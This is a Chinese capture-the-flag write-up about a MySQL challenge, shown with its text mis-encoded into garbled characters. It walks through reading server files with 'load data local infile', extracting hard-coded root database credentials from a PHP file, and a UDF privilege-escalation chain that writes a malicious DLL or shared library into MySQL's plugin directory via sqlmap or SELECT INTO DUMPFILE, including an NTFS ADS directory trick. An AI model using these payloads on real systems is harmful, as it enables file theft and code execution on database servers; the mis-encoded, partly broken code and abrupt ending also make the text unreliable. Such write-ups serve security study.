title="ç¯å¢ƒçš„æ­å»º:"></a>ç¯å¢ƒçš„æ­å»º:</h2><p>è®¿é—®æˆ‘çš„é¢˜ç›®ç¯å¢ƒ:<br><img src="/images/2024-2-3-only_sql/image-20240202143718334.png" alt="image-20240202143718334"></p><p>é¢˜ç›®çš„è¦æ±‚å°±æ˜¯å…ˆè®©æˆ‘ä»¬è¿æ¥ä¸€ä¸ªæ•°æ®åº“ï¼Œè¿™ä¸ªæ•°æ®åº“å¯ä»¥æ˜¯ä»»æ„çš„æ•°æ®åº“ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤ŸçŸ¥é“æ•°æ®åº“çš„åœ°å€ï¼Œç”¨æˆ·åï¼Œå¯†ç ï¼Œè¦è¿æ¥çš„æ•°æ®åº“åå°±å¯ä»¥ï¼Œç”±äºæˆ‘ä»¬æœ¬èº«ä¸çŸ¥é“ï¼Œé¢˜ç›®çš„æ•°æ®åº“åœ°å€ä»¥åŠå…¶ä»–ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨åªèƒ½è¿æ¥è‡ªå·±å·²çŸ¥é“çš„æ•°æ®åº“ï¼Œæ¯”å¦‚æˆ‘ä»¬çš„æœ¬åœ°æ•°æ®åº“ï¼Œè¿æ¥æˆåŠŸä»¥åå°±å¯ä»¥å¯¹æˆ‘ä»¬çš„æ•°æ®åº“è¿›è¡Œä¸€åˆ‡çš„æ“ä½œï¼ˆæ•°æ®åº“æ”¯æŒçš„æ“ä½œåˆæ³•è¯­å¥ï¼‰ï¼Œå³ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªmysqlçš„æœåŠ¡ç«¯ï¼Œä½†ç”±äºæœ¬äººæ¯”è¾ƒèœï¼Œæ‰€ä»¥åªå†™äº†ä¸€ä¸ªç®€æ˜“çš„æ“ä½œç«¯å£ï¼Œç”¨ä¸€ä¸ªè¡¨å•ä¼ é€’æˆ‘ä»¬çš„æ•°æ®åº“æ“ä½œè¯­å¥ï¼Œåœ¨è¿æ¥æ—¶ç›´æ¥è¿›è¡Œæ“ä½œã€‚</p><p><img src="/images/2024-2-3-only_sql/image-20240202143602563.png" alt="image-20240202143602563"></p><p>æˆ‘åœ¨æˆ‘çš„æœ¬åœ°æ•°æ®åº“ä¸­åˆ›å»ºäº†ä¸€å¼ testè¡¨ç”¨äºå¯¹ç¯å¢ƒçš„æµ‹è¯•ï¼Œç°åœ¨æˆ‘ä½¿ç”¨æˆ‘çš„æ•°æ®åº“ä¿¡æ¯ï¼Œä»¥åŠsqlè¯­å¥è¿›è¡Œå¯¹ç¯å¢ƒçš„æµ‹è¯•ã€‚</p><h2 id="ç¯å¢ƒæµ‹è¯•"><a href="#ç¯å¢ƒæµ‹è¯•" class="headerlink" title="ç¯å¢ƒæµ‹è¯•:"></a>ç¯å¢ƒæµ‹è¯•:</h2><p><img src="/images/2024-2-3-only_sql/image-20240202144824585.png" alt="image-20240202144824585"></p><h3 id="sqlè¯­å¥"><a href="#sqlè¯­å¥" class="headerlink" title="sqlè¯­å¥:"></a>sqlè¯­å¥:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">INSERT INTO test (text_field) VALUES (&#x27;flag&#123;666&#125;&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202145356151.png" alt="image-20240202145356151"></p><p><img src="/images/2024-2-3-only_sql/image-20240202145106390.png" alt="image-20240202145106390"></p><p><img src="/images/2024-2-3-only_sql/image-20240202145130651.png" alt="image-20240202145130651"></p><p>æˆåŠŸè¿›è¡Œæ‰§è¡Œï¼ï¼ï¼</p><p>ç¯å¢ƒçš„åŸºæœ¬è¿è¡Œé€»è¾‘å°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ç”±äºä¸€äº›æœ¬åœ°æƒé™çš„é…ç½®ï¼Œæ‰€ä»¥ä¸€äº›ä¸šåŠ¡æ“ä½œçš„æ•°æ®åº“è¯­å¥æ— æ³•é€šè¿‡ç½‘ç»œç›´æ¥è¿›è¡Œæ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½åœ¨æœ¬åœ°çš„mysqlæœåŠ¡ç«¯ä¸­è¿›è¡Œæµ‹è¯•ã€‚</p><h2 id="è¿œç¨‹è¯»å®¢æˆ·ç«¯æ–‡ä»¶ï¼š"><a href="#è¿œç¨‹è¯»å®¢æˆ·ç«¯æ–‡ä»¶ï¼š" class="headerlink" title="è¿œç¨‹è¯»å®¢æˆ·ç«¯æ–‡ä»¶ï¼š"></a>è¿œç¨‹è¯»å®¢æˆ·ç«¯æ–‡ä»¶ï¼š</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/query.php&quot; into table test<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨é¢˜ç›®ç¯å¢ƒæˆåŠŸè¿æ¥æˆ‘ä»¬çš„æ•°æ®åº“æœåŠ¡ç«¯ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨load data,æ•°æ®åº“æ“ä½œè¯­å¥è¯»å–é¢˜ç›®ç½‘é¡µçš„æ–‡ä»¶ä¿¡æ¯ï¼Œå³å¯ä»¥åˆ©ç”¨è¯¥æ“ä½œï¼Œè¯»å–é¢˜ç›®çš„query.phpæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å­˜åœ¨äº&#x2F;var&#x2F;www&#x2F;html&#x2F;æ–‡ä»¶å¤¹ä¸‹ã€‚</p><h3 id="æœ¬åœ°æµ‹è¯•"><a href="#æœ¬åœ°æµ‹è¯•" class="headerlink" title="æœ¬åœ°æµ‹è¯•:"></a>æœ¬åœ°æµ‹è¯•:</h3><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶åœ¨æˆ‘ä»¬çš„apacheæœåŠ¡ç«¯ä¸‹:<br>flag.txt:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;you_are_win!!!&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202151238614.png" alt="image-20240202151238614"></p><p>ç°åœ¨ä½¿ç”¨mysqlçš„æ–‡ä»¶ä¸‹è½½æ“ä½œï¼Œè¯»å–æˆ‘ä»¬çš„flag.txt:</p><h3 id="æ–‡ä»¶æ•°æ®ä¸‹è½½"><a href="#æ–‡ä»¶æ•°æ®ä¸‹è½½" class="headerlink" title="æ–‡ä»¶æ•°æ®ä¸‹è½½:"></a>æ–‡ä»¶æ•°æ®ä¸‹è½½:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/flag.txt&quot; into table test<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202151636383.png" alt="image-20240202151636383"></p><p>æˆåŠŸå°†flag.txtæ–‡ä»¶ä¸‹è½½åˆ°æˆ‘ä»¬çš„testè¡¨çš„text_fieldå­—æ®µä¸­ï¼ï¼ï¼</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é¢˜ç›®çš„mysqlæœåŠ¡ç«¯ä¸‹è½½é¢˜ç›®ç½‘é¡µä¸­çš„æ–‡ä»¶ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">load data local infile &quot;/var/www/html/query.php&quot; into table test;<br></code></pre></td></tr></table></figure><h3 id="query-php"><a href="#query-php" class="headerlink" title="query.php:"></a>query.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// mine</span><br><span class="hljs-comment">// $db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="hljs-comment">// $db_username = &#x27;root&#x27;;</span><br><span class="hljs-comment">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><br><span class="hljs-comment">// $db_name = &#x27;mysql&#x27;;</span><br><span class="hljs-variable">$$db_host</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_host&quot;</span>];<br><span class="hljs-variable">$$db_username</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_username&quot;</span>];<br><span class="hljs-variable">$$db_password</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_password&quot;</span>];<br><span class="hljs-variable">$$db_name</span> = <span class="hljs-variable">$$_POST</span>[<span class="hljs-string">&quot;db_name&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<br><span class="hljs-variable">$db_host</span>))&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        $<br>dsn = <span class="hljs-string">&quot;mysql:host=</span><br><span class="hljs-string"><span class="hljs-subst">$db_host</span>;dbname=$</span><br><span class="hljs-string">db_name&quot;</span>;<br>        <br><span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>($<br>dsn, <br><span class="hljs-variable">$db_username</span>, $<br>db_password);<br>        <br><span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>, PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br>        $<br>_SESSION[<span class="hljs-string">&#x27;dsn&#x27;</span>]=<br><span class="hljs-variable">$dsn</span>;<br>        $<br>_SESSION[<span class="hljs-string">&#x27;db_username&#x27;</span>]=<br><span class="hljs-variable">$db_username</span>;<br>        $<br>_SESSION[<span class="hljs-string">&#x27;db_password&#x27;</span>]=<br><span class="hljs-variable">$db_password</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> $<br>e) &#123;<br>       <span class="hljs-keyword">die</span>(<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;dsn&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;è¯·å…ˆè¿æ¥æ•°æ®åº“);window.location.href=&#x27;index.php&#x27;&lt;/script&gt;&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»£ç å®¡è®¡æˆ‘ä»¬å¾—åˆ°äº†å‡ºé¢˜äººæä¾›çš„æ•°æ®åº“ä¿¡æ¯:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">// $db_host = &#x27;127.0.0.1&#x27;;<br>// $db_username = &#x27;root&#x27;;<br>// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;<br>// $db_name = &#x27;mysql&#x27;;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥æ•°æ®åº“ä¿¡æ¯å»è¿æ¥ï¼Œä»è€Œå»è·å–å‡ºé¢˜äººçš„ç½‘é¡µä¸­çš„æ•°æ®åº“ä¿¡æ¯ä»¥åŠæ–‡ä»¶ä¿¡æ¯ã€‚</p><h2 id="plugin-udf-ææƒ"><a href="#plugin-udf-ææƒ" class="headerlink" title="plugin udf ææƒ"></a>plugin udf ææƒ</h2><h3 id="åˆ©ç”¨å‰æ"><a href="#åˆ©ç”¨å‰æ" class="headerlink" title="åˆ©ç”¨å‰æ:"></a>åˆ©ç”¨å‰æ:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &lt; 5.0ï¼Œå¯¼å‡ºè·¯å¾„éšæ„<br>5.0 &lt;= mysql &lt; 5.1ï¼Œudf.dll åˆ™éœ€è¦å¯¼å‡ºè‡³ç›®æ ‡æœåŠ¡å™¨çš„ç³»ç»Ÿç›®å½• (å¦‚ï¼šc:/windows/system32/)<br>mysql &gt;= 5.1ï¼Œudf.dll å¿…é¡»è¦æŠŠudf.dllæ–‡ä»¶æ”¾åˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°<br>æŒæ¡mysqlæ•°æ®åº“çš„è´¦æˆ·ï¼Œä»æ‹¥æœ‰å¯¹mysqlçš„insertå’Œdeleteæƒé™ï¼Œä»¥åˆ›å»ºå’ŒæŠ›å¼ƒå‡½æ•°ã€‚<br>æ‹¥æœ‰å¯ä»¥å°†udf.dllå†™å…¥ç›¸åº”ç›®å½•çš„æƒé™<br></code></pre></td></tr></table></figure><h3 id="ä½¿ç”¨udfææƒçš„ä¸€äº›æ“ä½œ"><a href="#ä½¿ç”¨udfææƒçš„ä¸€äº›æ“ä½œ" class="headerlink" title="ä½¿ç”¨udfææƒçš„ä¸€äº›æ“ä½œ:"></a>ä½¿ç”¨udfææƒçš„ä¸€äº›æ“ä½œ:</h3><h4 id="æŸ¥çœ‹é¶æœºçš„mysqlç‰ˆæœ¬ä¿¡æ¯"><a href="#æŸ¥çœ‹é¶æœºçš„mysqlç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹é¶æœºçš„mysqlç‰ˆæœ¬ä¿¡æ¯"></a>æŸ¥çœ‹é¶æœºçš„mysqlç‰ˆæœ¬ä¿¡æ¯</h4><p>(è¿™é‡Œç”¨æœ¬åœ°çš„mysqlä»£æ›¿)ï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>SELECT VERSION();<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202154824045.png" alt="image-20240202154824045"></p><p>æ•°æ®åº“ç‰ˆæœ¬ä¸º10.11.5,å› ä¸ºMySQL &gt;&#x3D; 5.1å·²ç»æ˜¯ç¯å¢ƒæœ€è‹›åˆ»çš„äº†,æ‰€ä»¥æ— æ³•å†è¿›è¡Œæœ¬åœ°æµ‹è¯•äº†ã€‚</p><h4 id="æŸ¥è¯¢å¯å†™ç›®å½•"><a href="#æŸ¥è¯¢å¯å†™ç›®å½•" class="headerlink" title="æŸ¥è¯¢å¯å†™ç›®å½•:"></a>æŸ¥è¯¢å¯å†™ç›®å½•:</h4><p>åœ¨ MySQL 5.5 ä¹‹å‰ secure_file_priv é»˜è®¤æ˜¯ç©ºï¼Œè¿™ä¸ªæƒ…å†µä¸‹è¡¨ç¤ºå¯ä»¥å‘ä»»æ„ç»å¯¹è·¯å¾„å†™æ–‡ä»¶</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>show global variables like &#x27;%secure_file_priv%&#x27;;<br></code></pre></td></tr></table></figure><h4 id="å¯»æ‰¾æ’ä»¶ç›®å½•"><a href="#å¯»æ‰¾æ’ä»¶ç›®å½•" class="headerlink" title="å¯»æ‰¾æ’ä»¶ç›®å½•:"></a>å¯»æ‰¾æ’ä»¶ç›®å½•:</h4><p>mysqlæ•°æ®åº“ç‰ˆæœ¬ &gt;&#x3D; 5.1ï¼Œudf.dll å¿…é¡»è¦æŠŠudf.dllæ–‡ä»¶æ”¾åˆ°MySQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œæ¥ä¸‹æ¥å»æ‰¾dllæ–‡ä»¶</p><h5 id="ä½¿ç”¨å¦‚ä¸‹çš„-SQL-è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•"><a href="#ä½¿ç”¨å¦‚ä¸‹çš„-SQL-è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•" class="headerlink" title="ä½¿ç”¨å¦‚ä¸‹çš„ SQL è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•:"></a>ä½¿ç”¨å¦‚ä¸‹çš„ SQL è¯­å¥æ¥æŸ¥è¯¢MySQLçš„æ’ä»¶ç›®å½•:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/eb29293c33a6361d45a077a2b983079b.png" alt="img"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¦‚æœä¸å­˜åœ¨çš„è¯å¯ä»¥åœ¨ webshell ä¸­æ‰¾åˆ° MySQL çš„å®‰è£…ç›®å½•ç„¶åæ‰‹å·¥åˆ›å»º \lib\plugin æ–‡ä»¶å¤¹<br><br>æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦æ³¨æ„ï¼šåˆ©ç”¨phpstudyå®‰è£…çš„mysqlï¼Œé»˜è®¤æ˜¯ä¸å­˜åœ¨ \lib\plugin è¿™ä¸ªæ–‡ä»¶å¤¹çš„ï¼Œå¦‚æœç›®æ ‡å®‰è£…çš„æ˜¯å®Œæ•´ç‰ˆmysqlæ•°æ®åº“ï¼Œæ˜¯å­˜åœ¨çš„ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹åè¾¹çš„æ“ä½œå°±æ— æ³•ç»§ç»­äº†<br></code></pre></td></tr></table></figure><h4 id="åˆ›å»ºæ–‡ä»¶å¤¹"><a href="#åˆ›å»ºæ–‡ä»¶å¤¹" class="headerlink" title="åˆ›å»ºæ–‡ä»¶å¤¹:"></a>åˆ›å»ºæ–‡ä»¶å¤¹:</h4><p>ç½‘ä¸Šæœ‰ä¸ªè¯´æ³•ï¼Œåˆ©ç”¨<strong>NTFS ADS</strong>æµæ¨¡å¼çªç ´è¿›è€Œåˆ›å»ºæ–‡ä»¶å¤¹</p><h5 id="ä½¿ç”¨è¯­å¥æŸ¥æ‰¾MySQLå®‰è£…ç›®å½•"><a href="#ä½¿ç”¨è¯­å¥æŸ¥æ‰¾MySQLå®‰è£…ç›®å½•" class="headerlink" title="ä½¿ç”¨è¯­å¥æŸ¥æ‰¾MySQLå®‰è£…ç›®å½•:"></a>ä½¿ç”¨è¯­å¥æŸ¥æ‰¾MySQLå®‰è£…ç›®å½•:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>select @@basedir;<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-only_sql/image-20240202161019150.png" alt="image-20240202161019150"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;;    //åˆ©ç”¨NTFS ADSåˆ›å»ºlibç›®å½•<br><br>select &#x27;It is dll&#x27; into dumpfile &#x27;mysqlå®‰è£…ç›®å½•\\lib::$INDEX_ALLOCATION&#x27;;<br><br> <br>select &#x27;It is dll&#x27; into dumpfile &#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;;    //åˆ©ç”¨NTFS ADSåˆ›å»ºpluginç›®å½•<br><br>select &#x27;It is dll&#x27; into dumpfile &#x27;mysqlå®‰è£…ç›®å½•\\lib\\plugin::$INDEX_ALLOCATION&#x27;;<br></code></pre></td></tr></table></figure><p>å¦‚æœçœŸçš„æ²¡æœ‰<code>\lib\plugin</code>è¿˜æ˜¯å¯ä»¥å°è¯•ï¼Œä½†æ˜¯ä¸ä¸€å®šæˆåŠŸã€‚</p><h4 id="å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š"><a href="#å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š" class="headerlink" title="å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š"></a>å†™å…¥åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ï¼š</h4><h5 id="ç¬¬ä¸€ç§æƒ…å†µ"><a href="#ç¬¬ä¸€ç§æƒ…å†µ" class="headerlink" title="ç¬¬ä¸€ç§æƒ…å†µ:"></a>ç¬¬ä¸€ç§æƒ…å†µ:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.å¦‚æœæ‹¿åˆ°äº†ç½‘ç«™çš„webshellï¼Œå¯ä»¥ç›´æ¥é€šè¿‡webshellç®¡ç†å·¥å…·æ¯”å¦‚èšå‰‘ç­‰ï¼Œç›´æ¥æ‰¾åˆ°ç›®å½•ä¸Šä¼ dllæ–‡ä»¶<br></code></pre></td></tr></table></figure><h5 id="ç¬¬äºŒç§æƒ…å†µ"><a href="#ç¬¬äºŒç§æƒ…å†µ" class="headerlink" title="ç¬¬äºŒç§æƒ…å†µ:"></a>ç¬¬äºŒç§æƒ…å†µ:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">2.å­˜åœ¨ SQL æ³¨å…¥ä¸”æ˜¯é«˜æƒé™ï¼Œplugin ç›®å½•å¯å†™ä¸”éœ€è¦ secure_file_priv æ— é™åˆ¶ï¼ŒMySQL æ’ä»¶ç›®å½•å¯ä»¥è¢« MySQL ç”¨æˆ·å†™å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ sqlmap æ¥ä¸Šä¼ åŠ¨æ€é“¾æ¥åº“ï¼Œåˆå› ä¸º GET æœ‰å­—èŠ‚é•¿åº¦é™åˆ¶ï¼ˆHTTPæœ¬èº«å¹¶æœªå¯¹è¯·æ±‚é•¿åº¦æ–½åŠ ä»»ä½•ç¡¬ç¼–ç çš„é™åˆ¶ï¼Œä½†æµè§ˆå™¨çš„é™åˆ¶èŒƒå›´ä¸º2kb-8kbï¼‰æ‰€ä»¥å¾€å¾€ POST æ³¨å…¥æ‰å¯ä»¥æ‰§è¡Œè¿™ç§æ”»å‡»<br></code></pre></td></tr></table></figure><h6 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">sqlmap -u &quot;http://localhost:30008/&quot; --data=&quot;id=1&quot; --file-write=&quot;usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll&quot; --file-dest=&quot;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&quot;<br></code></pre></td></tr></table></figure><h5 id="ç¬¬ä¸‰ç§æƒ…å†µ"><a href="#ç¬¬ä¸‰ç§æƒ…å†µ" class="headerlink" title="ç¬¬ä¸‰ç§æƒ…å†µ:"></a>ç¬¬ä¸‰ç§æƒ…å†µ:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¦‚æœæ²¡æœ‰æ³¨å…¥çš„è¯ï¼Œä½†æ˜¯é€šè¿‡çˆ†ç ´å¯†ç ã€phpmyadminæ¼æ´ä»¥åŠé€šè¿‡webshellç­‰æ‰‹æ®µï¼Œå¯ä»¥æ‰§è¡Œsqlè¯­å¥ï¼Œä¹Ÿæ˜¯å¯ä»¥å¯ä»¥æ“ä½œåŸç”Ÿ SQL è¯­å¥æ‰‹å·¥å†™æ–‡ä»¶åˆ° plugin ç›®å½•ä¸‹çš„<br></code></pre></td></tr></table></figure><h6 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br># ç›´æ¥ SELECT æŸ¥è¯¢åå…­è¿›åˆ¶å†™å…¥<br>SELECT 0xcode INTO DUMPFILE &#x27;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&#x27;;<br><br># è§£ç åå…­è¿›åˆ¶å†å†™å…¥å¤šæ­¤ä¸€ä¸¾<br>SELECT unhex(&#x27;0xcode&#x27;) INTO DUMPFILE &#x27;c:\\ZkeysSoft\\MySql\\MySQL Server 5.1\\lib\\plugin\\udf.dll&#x27;;<br></code></pre></td></tr></table></figure><p>å…³äºåå…­è¿›åˆ¶å¯ä»¥ç›´æ¥è¿™è¿™ä¸ªé¡µé¢æŸ¥è¯¢åˆ°å¯¹åº”çš„ç¼–ç ï¼š<a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a></p><p>ä¸€èˆ¬ä¸ºäº†æ›´æ–¹ä¾¿è§‚å¯Ÿï¼Œå¯ä»¥å°†ç¼–ç åçš„ç»“æœå¯¼å…¥åˆ°æ–°çš„æ–‡ä»¶ä¸­æ–¹ä¾¿è§‚å¯Ÿï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">mysql &gt;<br>SELECT hex(load_file(&#x27;/lib_mysqludf_sys_64.so&#x27;)) into dumpfile &#x27;/tmp/udf.txt&#x27;; <br><br>SELECT hex(load_file(0x2f6c69625f6d7973716c7564665f7379735f36342e736f)) into dumpfile &#x27;/tmp/udf.txt&#x27;;<br><br>0x2f6c69625f6d7973716c7564665f7379735f36342e736f<br>=&gt;<br>/lib_mysqludf_sys_64.so<br></code></pre></td></tr></table></figure><p>å°†lib_mysqludf_sys_64.soæ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œ16è¿›åˆ¶åŠ å¯†ä¹‹åå­˜å…¥&#x2F;tmp&#x2F;udf.txtæ–‡ä»¶ä¸­</p><h4 id="ä¸Šä¼ åº“æ–‡ä»¶åˆ°è¢«æ”»å‡»çš„æ•°æ®åº“pluginç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯ä»¥ä»»æ„å–"><a href="#ä¸Šä¼ åº“æ–‡ä»¶åˆ°è¢«æ”»å‡»çš„æ•°æ®åº“pluginç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯ä»¥ä»»æ„å–" class="headerlink" title="ä¸Šä¼ åº“æ–‡ä»¶åˆ°è¢«æ”»å‡»çš„æ•°æ®åº“pluginç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯ä»¥ä»»æ„å–:"></a>ä¸Šä¼ åº“æ–‡ä»¶åˆ°è¢«æ”»å‡»çš„æ•°æ®åº“pluginç›®å½•ä¸‹ï¼Œæ–‡ä»¶åå¯ä»¥ä»»æ„å–:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">select unhex(&#x27;7F454C46020...&#x27;) into dumpfile &#x27;/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so&#x27;;<br><br>å‡è®¾/tmp/udf.txtæ–‡ä»¶ä¸­çš„16è¿›åˆ¶å†…å®¹ä¸ºxxx,åˆ™å°±æ˜¯å°†xxx16è¿›åˆ¶è§£ç 